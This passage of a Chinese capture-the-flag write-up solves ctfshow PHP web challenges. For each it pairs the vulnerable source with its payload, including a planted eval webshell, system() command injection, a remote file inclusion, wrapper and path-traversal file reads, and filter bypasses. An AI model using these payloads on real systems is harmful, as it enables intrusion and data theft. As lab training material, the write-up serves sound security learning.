&quot;abc\\nabc&quot;;$preg = &quot;/^abc$/m&quot;;preg_match($preg, $str,$matchs);这样其实是符合正则表达式的，因为匹配的时候 先是匹配换行符前面的，接着匹配换行符后面的，两个都是abc所以可以通过正则表达式。s特殊字符圆点 . 中包含换行符默认的圆点 . 是匹配除换行符 \\n 之外的任何单字符，加上s之后, .包含换行符$str = &quot;abggab\\nacbs&quot;;$preg = &quot;/b./s&quot;;preg_match_all($preg, $str,$matchs);这样匹配到的有三个 bg b\\n bsA强制从目标字符串开头匹配;D如果使用$限制结尾字符,则不允许结尾有换行; e配合函数preg_replace()使用, 可以把匹配来的字符串当作正则表达式执行; 1# 直接使用换行符号分割即可# %0a 是 换行符?cmd=%0aphp 1.4 Web 92 — intval 可解析十六进制、八进制1&lt;?php include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num==4476)&#123; die(&quot;no no no!&quot;); &#125; if(intval($num,0)==4476)&#123; echo $flag; &#125;else&#123; echo intval($num,0); &#125;&#125; 1?num=0x117c #十六进制 Hex?num=010574 #八进制 oct?num=%20010574# ?num=4476sqs 不行，由于 $num==4476 1.5 Web 93 — 八进制不含字母，十六进制含字母1&lt;?php include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num==4476)&#123; die(&quot;no no no!&quot;); &#125; if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123; die(&quot;no no no!&quot;); &#125; if(intval($num,0)==4476)&#123; echo $flag; &#125;else&#123; echo intval($num,0); &#125;&#125; 1?num=010574 #oct 1.6 Web 94 — 正则绕过 — %20 %0a1&lt;?php include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num===&quot;4476&quot;)&#123; die(&quot;no no no!&quot;); &#125; if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123; die(&quot;no no no!&quot;); &#125; if(!strpos($num, &quot;0&quot;))&#123; die(&quot;no no no!&quot;); &#125; if(intval($num,0)===4476)&#123; echo $flag; &#125;&#125; 1#0在其中的位置不能是0，即最开始，即不能以0开头?num=%0a010574?num=4476.0?num=%20010574 1.7 Web 95 — 正则绕过1&lt;?php include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num==4476)&#123; die(&quot;no no no!&quot;); &#125; if(preg_match(&quot;/[a-z]|\\./i&quot;, $num))&#123; die(&quot;no no no!!&quot;); &#125; if(!strpos($num, &quot;0&quot;))&#123; die(&quot;no no no!!!&quot;); &#125; if(intval($num,0)===4476)&#123; echo $flag; &#125;&#125; 1?num=%0a010574?num=%20010574?num=+010574 1.8 Web 96 — 路径书写1&lt;?php highlight_file(__FILE__);if(isset($_GET[&#x27;u&#x27;]))&#123; if($_GET[&#x27;u&#x27;]==&#x27;flag.php&#x27;)&#123; die(&quot;no no no&quot;); &#125;else&#123; highlight_file($_GET[&#x27;u&#x27;]); &#125;&#125; 1?u=./flag.php #路径?u=/var/www/html/flag.php?u=php://filter/resource=flag.php 1.9 Web 97 — md5 数组 [ ] 绕过 — if ($_POST[&#39;a&#39;] != $_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;]))1&lt;?php include(&quot;flag.php&quot;);highlight_file(__FILE__);if (isset($_POST[&#x27;a&#x27;]) and isset($_POST[&#x27;b&#x27;])) &#123;if ($_POST[&#x27;a&#x27;] != $_POST[&#x27;b&#x27;])if (md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;]))echo $flag;elseprint &#x27;Wrong.&#x27;;&#125;?&gt; 1a[]=1&amp;b[]=2 1.10 Web 98 — 三目运算符、变量覆盖1&lt;?php include(&quot;flag.php&quot;);$_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;;$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_COOKIE:&#x27;flag&#x27;;$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_SERVER:&#x27;flag&#x27;;highlight_file($_GET[&#x27;HTTP_FLAG&#x27;]==&#x27;flag&#x27;?$flag:__FILE__);?&gt; 1#三目运算符以及变量覆盖若GET传参，POST值将覆盖GET值 1get传参：?flag=1post传参：?HTTP_FLAG=flag 1.11 Web 99 — file_put_contents1&lt;?php highlight_file(__FILE__);$allow = array();for ($i=36; $i &lt; 0x36d; $i++) &#123; array_push($allow, rand(1,$i));&#125;if(isset($_GET[&#x27;n&#x27;]) &amp;&amp; in_array($_GET[&#x27;n&#x27;], $allow))&#123; file_put_contents($_GET[&#x27;n&#x27;], $_POST[&#x27;content&#x27;]);&#125;?&gt; 1当没有第三个参数时，in_array之中的比较与 == 一致当第三个参数为 true 时，in_array之中的比较与 === 一致$allow = array(1,&#x27;2&#x27;,&#x27;3&#x27;);var_dump(in_array(&#x27;1.php&#x27;,$allow));#类型不同，首先转换，返回 true$allow = array(&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;);var_dump(in_array(&#x27;1.php&#x27;,$allow));#类型一致，直接比较，返回false 1# payload?n=1.phpcontent=&lt;?php @eval($_POST[&#x27;a&#x27;]); ?&gt; 访问 /1.php 1.12 Web 100 — eval(“$v2(‘ctfshow’)$v3”);1&lt;?php highlight_file(__FILE__);include(&quot;ctfshow.php&quot;);//flag in class ctfshow;$ctfshow = new ctfshow();$v1=$_GET[&#x27;v1&#x27;];$v2=$_GET[&#x27;v2&#x27;];$v3=$_GET[&#x27;v3&#x27;];$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);if($v0)&#123; if(!preg_match(&quot;/\\;/&quot;, $v2))&#123; if(preg_match(&quot;/\\;/&quot;, $v3))&#123; eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;); &#125; &#125; &#125;?&gt; 测试： 1&lt;?phpvar_dump(true and true and false); // falsevar_dump(true and false and false);// falsevar_dump(true &amp;&amp; true &amp;&amp; false);// falsevar_dump(true &amp;&amp; false &amp;&amp; false);// false$a=true and false and false;var_dump($a); // true$b = true &amp;&amp; false &amp;&amp; false;var_dump($b); //false$c = true &amp; false &amp; false;var_dump($c); //bool(0) 1&lt;?php$a=true and false and false;var_dump($a); // trueif($a === true and false and false)&#123; echo &#x27;111&#x27;; //不输出&#125; 1&lt;?php$a=false and true and true;var_dump($a); if($a == false and true and true)&#123; echo &#x27;111&#x27;; &#125;//bool(false) 111 11. if($v0)绕过：v1 是数字2. v2 不能有分号，那么无法使用 命令执行函数，那么使用 ``3. 使用注释将 v3 注释掉，相当于把 (&#x27;ctfshow&#x27;) 注释掉4. 注意，v3 一定要写上 ; 1# payload?v1=1&amp;v2=var_dump($ctfshow)/*&amp;v3=*/;?v1=1&amp;v2=?&gt;&lt;?php echo `ls`?&gt;/*&amp;v3=;*/?v1=1&amp;v2=?&gt;&lt;?php echo `cat ctfshow.php`?&gt;/*&amp;v3=;*/?v1=1&amp;v2=-system(&#x27;ls&#x27;)-&amp;v3=-1;?v1=1&amp;v2=echo&amp;v3=;system(&#x27;ls&#x27;); 构造成下面的感觉 查 ctfshow.php 试试 其中，0x2d 是 - 1.13 Web 101 — ReflectionClass 关于一个类的反射http://www.thinkphp.cn/code/4863.html 1修补100题非预期,替换0x2d 1&lt;?phphighlight_file(__FILE__);include(&quot;ctfshow.php&quot;);//flag in class ctfshow;$ctfshow = new ctfshow();$v1=$_GET[&#x27;v1&#x27;];$v2=$_GET[&#x27;v2&#x27;];$v3=$_GET[&#x27;v3&#x27;];$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);if($v0)&#123; if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\)|\\-|\\_|\\+|\\=|\\&#123;|\\[|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?|[0-9]/&quot;, $v2))&#123; if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\(|\\-|\\_|\\+|\\=|\\&#123;|\\[|\\&quot;|\\&#x27;|\\,|\\.|\\?|[0-9]/&quot;, $v3))&#123; eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;); &#125; &#125; &#125;?&gt; 上面的 v2 构造的符号 被过滤 构造 eval(echo new ReflectionClass(‘ctfshow’)); 1?v1=1&amp;v2=echo new ReflectionClass&amp;v3=; 1.14 Web 1021&lt;?phphighlight_file(__FILE__);$v1 = $_POST[&#x27;v1&#x27;];$v2 = $_GET[&#x27;v2&#x27;];$v3 = $_GET[&#x27;v3&#x27;];$v4 = is_numeric($v2) and is_numeric($v3);if($v4)&#123; $s = substr($v2,2); $str = call_user_func($v1,$s); echo $str; file_put_contents($v3,$str);&#125;else&#123; die(&#x27;hacker&#x27;);&#125;?&gt; 1 1.15 Web 1031 1.16 Web 104 — shal() 数组 [ ] 绕过1换个姿势 1&lt;?php highlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123; $v1 = $_POST[&#x27;v1&#x27;]; $v2 = $_GET[&#x27;v2&#x27;]; if(sha1($v1)==sha1($v2))&#123; echo $flag; &#125;&#125;?&gt; 1?v1=1?v2=1 1?v1[]=1?v2[]=2 1aaroZmOkaaK1STfYaaO8zKZFaa3OFF9m 1.17 Web 105 — 变量覆盖1&lt;?php highlight_file(__FILE__);include(&#x27;flag.php&#x27;);error_reporting(0);$error=&#x27;你还想要flag嘛？&#x27;;$suces=&#x27;既然你想要那给你吧！&#x27;;foreach($_GET as $key =&gt; $value)&#123; if($key===&#x27;error&#x27;)&#123; die(&quot;what are you doing?!&quot;); &#125; $$key=$$value; &#125;foreach($_POST as $key =&gt; $value)&#123; if($value===&#x27;flag&#x27;)&#123; die(&quot;what are you doing?!&quot;); &#125; $$key=$$value;&#125;if(!($_POST[&#x27;flag&#x27;]==$flag))&#123; die($error);&#125;echo &quot;your are good&quot;.$flag.&quot;\\n&quot;;die($suces);?&gt;你还想要flag嘛？ 1$$key=$$value; #变量覆盖，将值作为变量赋给键作为变量，如果传入，?suces=flag，即相当于 $suces=$flag，即将$flag的值赋给$suces，所以我只需要想办法 输出 $suces 即可 可以看到，仅仅传入以上内容，会显示 $error 报错，我们可以通过 POST传参，将 $flag 的值赋给 $error 即可 思考 通过 die(suces) 1get: suces=flagpost: flag= 通过 die(error) 1get: suces=flagpost: error=suces 1.15 Web 106 — shal() 数组 [ ] 绕过1&lt;?php highlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123; $v1 = $_POST[&#x27;v1&#x27;]; $v2 = $_GET[&#x27;v2&#x27;]; if(sha1($v1)==sha1($v2) &amp;&amp; $v1!=$v2)&#123; echo $flag; &#125;&#125;?&gt; 1v1[]=1v2[]=2 1.16 Web 107 — parse_str()1&lt;?phphighlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);if(isset($_POST[&#x27;v1&#x27;]))&#123; $v1 = $_POST[&#x27;v1&#x27;]; $v3 = $_GET[&#x27;v3&#x27;]; parse_str($v1,$v2); if($v2[&#x27;flag&#x27;]==md5($v3))&#123; echo $flag; &#125;&#125;?&gt; 1#parse_str($v1,$v2);把$1字符串解析到变量 $2当中，以数组形式get: ?v3=123456post: v1=flag=e10adc3949ba59abbe56e057f20f883e 1.17 Web 108 — ereg() 截断漏洞1&lt;?php highlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#x27;c&#x27;])===FALSE) &#123; die(&#x27;error&#x27;);&#125;//只有36d的人才能看到flagif(intval(strrev($_GET[&#x27;c&#x27;]))==0x36d)&#123; echo $flag;&#125;?&gt;error 1#strrev()反转字符串#intval()获取变量整数值#0x36d 的十进制是 877 1ereg() 存在00截断漏洞，即%00之后的内容不会进行匹配函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。 ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配 1?c=sds%00778 1.18 Web 109 — $v1($v2()) 内置类1&lt;?php highlight_file(__FILE__);error_reporting(0);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123; $v1 = $_GET[&#x27;v1&#x27;]; $v2 = $_GET[&#x27;v2&#x27;]; if(preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v1) &amp;&amp; preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v2))&#123; eval(&quot;echo new $v1($v2());&quot;); &#125;&#125;?&gt; 1#随便找个php中的内置类并且可以直接echo输出的就可以ExceptionReflectionClass?v1=ReflectionClass&amp;v2=system(&#x27;ls&#x27;)?v1=Exception&amp;v2=system(&#x27;ls&#x27;)?v1=ReflectionClass&amp;v2=system(&#x27;tac f*&#x27;)v1=Exception();system(&#x27;tac f*&#x27;);//&amp;v2=av1=ReflectionClass&amp;v2=system(&#x27;tac f*&#x27;) 1.19 Web 110 — new $v1($v2())1&lt;?php highlight_file(__FILE__);error_reporting(0);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123; $v1 = $_GET[&#x27;v1&#x27;]; $v2 = $_GET[&#x27;v2&#x27;]; if(preg_match(&#x27;/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/&#x27;, $v1))&#123; die(&quot;error v1&quot;); &#125; if(preg_match(&#x27;/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/&#x27;, $v2))&#123; die(&quot;error v2&quot;); &#125; eval(&quot;echo new $v1($v2());&quot;);&#125;?&gt; 1#FilesystemIterator类读取文件?v1=FilesystemIterator&amp;v2=getcwd 1.20 Web 111 — 变量覆盖 — $GLOBALS1变量覆盖 1&lt;?php highlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);function getFlag(&amp;$v1,&amp;$v2)&#123; eval(&quot;$$v1 = &amp;$$v2;&quot;); var_dump($$v1);&#125;if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123; $v1 = $_GET[&#x27;v1&#x27;]; $v2 = $_GET[&#x27;v2&#x27;]; if(preg_match(&#x27;/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\&lt;|\\&gt;/&#x27;, $v1))&#123; die(&quot;error v1&quot;); &#125; if(preg_match(&#x27;/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\&lt;|\\&gt;/&#x27;, $v2))&#123; die(&quot;error v2&quot;); &#125; if(preg_match(&#x27;/ctfshow/&#x27;, $v1))&#123; getFlag($v1,$v2); &#125; &#125;?&gt; 超全局变量 $GLOBALS $GLOBALS — 引用全局作用域中可用的全部变量 一个包含了全部变量的全局组合数组。变量的名字就是数组的键。 1array(8) &#123; [&quot;_GET&quot;]=&gt; array(0) &#123; &#125; [&quot;_POST&quot;]=&gt; array(0) &#123; &#125; [&quot;_COOKIE&quot;]=&gt; array(0) &#123; &#125; [&quot;_FILES&quot;]=&gt; array(0) &#123; &#125; [&quot;GLOBALS&quot;]=&gt; array(8) &#123; [&quot;_GET&quot;]=&gt; array(0) &#123; &#125; [&quot;_POST&quot;]=&gt; array(0) &#123; &#125; [&quot;_COOKIE&quot;]=&gt; array(0) &#123; &#125; [&quot;_FILES&quot;]=&gt; array(0) &#123; &#125; [&quot;GLOBALS&quot;]=&gt; *RECURSION* [&quot;a&quot;]=&gt; int(123) [&quot;b&quot;]=&gt; int(456) [&quot;c&quot;]=&gt; string(4) &quot;asdf&quot; &#125; [&quot;a&quot;]=&gt; int(123) [&quot;b&quot;]=&gt; int(456) [&quot;c&quot;]=&gt; string(4) &quot;asdf&quot;&#125; 1# payload?v1=ctfshow&amp;v2=GLOBALS# 将 $GLOBALS 赋值给 v2 , v2 再赋值给 v1 , 然后再 var_dump($v1)，就相当于 var_dump($GLOBALS) 1.21 Web 112 — 各种编码绕过 convert.iconv.UCS-2LE.UCS-2BE1&lt;?phphighlight_file(__FILE__);error_reporting(0);function filter($file)&#123; if(preg_match(&#x27;/\\.\\.\\/|http|https|data|input|rot13|base64|string/i&#x27;,$file))&#123; die(&quot;hacker!&quot;); &#125;else&#123; return $file; &#125;&#125;$file=$_GET[&#x27;file&#x27;];if(! is_file($file))&#123; highlight_file(filter($file));&#125;else&#123; echo &quot;hacker!&quot;;&#125; 1&lt;?phpecho iconv(&quot;UCS-2LE&quot;,&quot;UCS-2BE&quot;,&#x27;&lt;?php @eval($_POST[ab]);?&gt;&#x27;);# ?&lt;hp pe@av(l_$OPTSa[]b;)&gt;? 1# payload?file=php://filter/read=convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php# 得到 f$al=gc&quot;fthswod&#123;3c00bd-8cf124-2b-53b4da-72598e1bb4&#125;7;&quot;# 解码得到 flag https://www.php.net/manual/zh/mbstring.supported-encodings.php 1# 另解?file=php://filter/resource=flag.php?file=php://filter/read=convert.quoted-printable-encode/resource=flag.php?file=compress.zlib://flag.php#?file=compress.bzip2://flag.php# 别的一些编码绕过?file=php://filter/read=convert.quoted-printable-encode/resource=flag.php?file=compress.zlib://flag.php?file=php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php 1.22 Web 113 — /proc/self/root 多次重复1&lt;?phphighlight_file(__FILE__);error_reporting(0);function filter($file)&#123; if(preg_match(&#x27;/filter|\\.\\.\\/|http|https|data|data|rot13|base64|string/i&#x27;,$file))&#123; die(&#x27;hacker!&#x27;); &#125;else&#123; return $file; &#125;&#125;$file=$_GET[&#x27;file&#x27;];if(! is_file($file))&#123; highlight_file(filter($file));&#125;else&#123; echo &quot;hacker!&quot;;&#125; 1# 过滤 filter 可使用 zlib?file=compress.zlib://flag.php 1# 另解?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php# /proc/self/root 在 Linux 当中是指向根目录的 多次重复可绕过# ls /proc/self/root 得到的将会是根目录的文件 1.23 Web 114 — filter1&lt;?phperror_reporting(0);highlight_file(__FILE__); function filter($file)&#123; if(preg_match(&#x27;/compress|root|zip|convert|\\.\\.\\/|http|https|data|data|rot13|base64|string/i&#x27;,$file))&#123; die(&#x27;hacker!&#x27;); &#125;else&#123; return $file; &#125;&#125;$file=$_GET[&#x27;file&#x27;];echo &quot;师傅们居然tql都是非预期 哼！&quot;;if(! is_file($file))&#123; highlight_file(filter($file));&#125;else&#123; echo &quot;hacker!&quot;;&#125; 师傅们居然tql都是非预期 哼！ 1# filter 未被过滤?file=php://filter/resource=flag.php 1.24 Web 115 — trim() %0c 绕过1&lt;?phpinclude(&#x27;flag.php&#x27;);highlight_file(__FILE__);error_reporting(0);function filter($num)&#123; $num=str_replace(&quot;0x&quot;,&quot;1&quot;,$num); $num=str_replace(&quot;0&quot;,&quot;1&quot;,$num); $num=str_replace(&quot;.&quot;,&quot;1&quot;,$num); $num=str_replace(&quot;e&quot;,&quot;1&quot;,$num); $num=str_replace(&quot;+&quot;,&quot;1&quot;,$num); return $num;&#125;$num=$_GET[&#x27;num&#x27;];if(is_numeric($num) and $num!==&#x27;36&#x27; and trim($num)!==&#x27;36&#x27; and filter($num)==&#x27;36&#x27;)&#123; if($num==&#x27;36&#x27;)&#123; echo $flag; &#125;else&#123; echo &quot;hacker!!&quot;; &#125;&#125;else&#123; echo &quot;hacker!!!&quot;;&#125; hacker!!! 1# 测试&lt;?phpfor ($i=0; $i &lt;=128 ; $i++) &#123; $x=chr($i).&#x27;1&#x27;; if(trim($x)!==&#x27;1&#x27; &amp;&amp; is_numeric($x))&#123; echo urlencode(chr($i)).&quot;\\n&quot;; &#125;&#125;# %0C %2B - . 0 1 2 3 4 5 6 7 8 9 1?num=%0c36 1.25 Web 123 — $a=$_SERVER[‘argv’];1&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);$a=$_SERVER[&#x27;argv&#x27;];$c=$_POST[&#x27;fun&#x27;];if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123; if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\&#123;|\\&#125;|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?/&quot;, $c)&amp;&amp;$c&lt;=18)&#123; eval(&quot;$c&quot;.&quot;;&quot;); if($fl0g===&quot;flag_give_me&quot;)&#123; echo $flag; &#125; &#125;&#125;?&gt; 1# 变量名应该只有 字母、数字、下划线# GET 或 POST方式传进去的变量名,会自动将 空格 + . [ 转换为 _ ，重点是 仅仅替换一次 1# payloadfun=echo $flag&amp;CTF_SHOW=1&amp;CTF[SHOW.COM=2fun=$fl0g=%27flag_give_me%27&amp;CTF_SHOW=1&amp;CTF[SHOW.COM=2 #不行CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=var_dump($GLOBALS) #不行 $a=$_SERVER[‘argv’]; 11、cli模式（命令行）下 第一个参数$_SERVER[&#x27;argv&#x27;][0]是脚本名，其余的是传递给脚本的参数2、web网页模式下 在web页模式下必须在php.ini开启register_argc_argv配置项 设置register_argc_argv = On(默认是Off)，重启服务，$_SERVER[‘argv’]才会有效果 这时候的$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’] $argv,$argc在web模式下不适用 1# 预期解get: ?a=1+fl0g=flag_give_mepost: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1])# 测试&lt;?php$a=$_SERVER[&#x27;argv&#x27;];var_dump($a);传入 a=1+fl0g=flag_give_me结果如下array(2) &#123; [0]=&gt; string(3) &quot;a=1&quot; [1]=&gt; string(17) &quot;fl0g=flag_give_me&quot; &#125; 1# 另解POST CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=eval($a[0])GET /?$fl0g=flag_give_meGET:?$fl0g=flag_give_mePOST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=assert($a[0]) 1# 测试 Web php.ini开启register_argc_argv配置项 | 设置register_argc_argv = On 1.26 Web 125 — $a=$_SERVER[‘argv’];1&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);$a=$_SERVER[&#x27;argv&#x27;];$c=$_POST[&#x27;fun&#x27;];if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123; if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\&#123;|\\&#125;|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print/i&quot;, $c)&amp;&amp;$c&lt;=16)&#123; eval(&quot;$c&quot;.&quot;;&quot;); if($fl0g===&quot;flag_give_me&quot;)&#123; echo $flag; &#125; &#125;&#125;?&gt; 1get: ?a=1+fl0g=flag_give_mepost: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1]) 1.27 Web 126 — $a=$_SERVER[‘argv’];1&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);$a=$_SERVER[&#x27;argv&#x27;];$c=$_POST[&#x27;fun&#x27;];if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123; if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\&#123;|\\&#125;|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&quot;, $c) &amp;&amp; strlen($c)&lt;=16)&#123; eval(&quot;$c&quot;.&quot;;&quot;); if($fl0g===&quot;flag_give_me&quot;)&#123; echo $flag; &#125; &#125;&#125; 1get: ?a=1+fl0g=flag_give_mepost: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1]) 1.28 Web 127 — extract($_GET); 和 空格 绕过 _1&lt;?phperror_reporting(0);include(&quot;flag.php&quot;);highlight_file(__FILE__);$ctf_show = md5($flag);$url = $_SERVER[&#x27;QUERY_STRING&#x27;];//特殊字符检测function waf($url)&#123; if(preg_match(&#x27;/\\`|\\~|\\!|\\@|\\#|\\^|\\*|\\(|\\)|\\\\$|\\_|\\-|\\+|\\&#123;|\\;|\\:|\\[|\\]|\\&#125;|\\&#x27;|\\&quot;|\\&lt;|\\,|\\&gt;|\\.|\\\\\\|\\//&#x27;, $url))&#123; return true; &#125;else&#123; return false; &#125;&#125;if(waf($url))&#123; die(&quot;嗯哼？&quot;);&#125;else&#123; extract($_GET);&#125;if($ctf_show===&#x27;ilove36d&#x27;)&#123; echo $flag;&#125; ‘QUERY_STRING’ query string（查询字符串），如果有的话，通过它进行页面访问。 https://www.php.net/manual/zh/reserved.variables.server.php 1# + [ . 空格 会变成 _ # extract($_GET); 的作用即是将我们的 GET 传入的参数变成实打实的变量?ctf show=ilove36d 1.29 Web 128 — gettext 扩展 — get_defined_vars()1&lt;?phperror_reporting(0);include(&quot;flag.php&quot;);highlight_file(__FILE__);$f1 = $_GET[&#x27;f1&#x27;];$f2 = $_GET[&#x27;f2&#x27;];if(check($f1))&#123; var_dump(call_user_func(call_user_func($f1,$f2)));&#125;else&#123; echo &quot;嗯哼？&quot;;&#125;function check($str)&#123; return !preg_match(&#x27;/[0-9]|[a-z]/i&#x27;, $str);&#125; NULL gettext 扩展 查看php 扩展目录下是否有 php_gettext.dll 修改 php.ini extension=php_gettext.dll 去掉注释 php 下的 gettext 扩展使用 测试 1&lt;?phpecho gettext(&#x27;phpinfo&#x27;);echo _(&#x27;phpinfo&#x27;);?&gt;# 如果是未定义的字符，则将会返回原字符串root@kali:/var/www/html/learn# vi 3.phproot@kali:/var/www/html/learn# php 3.php phpinfophpinfo 1get_defined_vars( void) : array返回由所有已定义变量所组成的数组 # 测试&lt;?php$a = get_defined_vars();print_r($a);?&gt;# 返回Array( [_GET] =&gt; Array ( [ctfshow] =&gt; ilove36d ) [_POST] =&gt; Array ( ) [_COOKIE] =&gt; Array ( ) [_FILES] =&gt; Array ( ) [test] =&gt; Success!) 1?f1=_&amp;f2=get_defined_vars# 解释var_dump(call_user_func(call_user_func($f1,$f2)));var_dump(call_user_func(call_user_func(&#x27;_&#x27;,&#x27;get_defined_vars&#x27;)));var_dump(call_user_func(get_defined_vars)); 1.30 Web 129 — GET 中必须含有某内容1&lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#x27;f&#x27;]))&#123; $f = $_GET[&#x27;f&#x27;]; if(stripos($f, &#x27;ctfshow&#x27;)&gt;0)&#123; echo readfile($f); &#125;&#125; 1stripos() # 查找字符串在另一字符串中第一次出现的位置（不区分大小写）,从0开始 1# 解一# 远程文件包含 在自己的服务器上写上一句话 test.txt?f=http://url/test.txt?ctfshow 1# 解二# filter 伪协议?f=php://filter/read=convert.base64-encode|ctfshow/resource=flag.php 1# 解三# 目录穿越?f=/ctfshow/../../../../../var/www/html/flag.php 1.31 Web 130 — 正则最大回溯次数绕过https://www.jb51.net/article/49631.htm 1very very very（省略25万个very）ctfshow 1&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#x27;f&#x27;]))&#123; $f = $_POST[&#x27;f&#x27;]; if(preg_match(&#x27;/.+?ctfshow/is&#x27;, $f))&#123; die(&#x27;bye!&#x27;); &#125; if(stripos($f, &#x27;ctfshow&#x27;) === FALSE)&#123; die(&#x27;bye!!&#x27;); &#125; echo $flag;&#125; 考察点：利用正则最大回溯次数绕过 PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false。这样我们就可以绕过第一个正则表达式了 1import 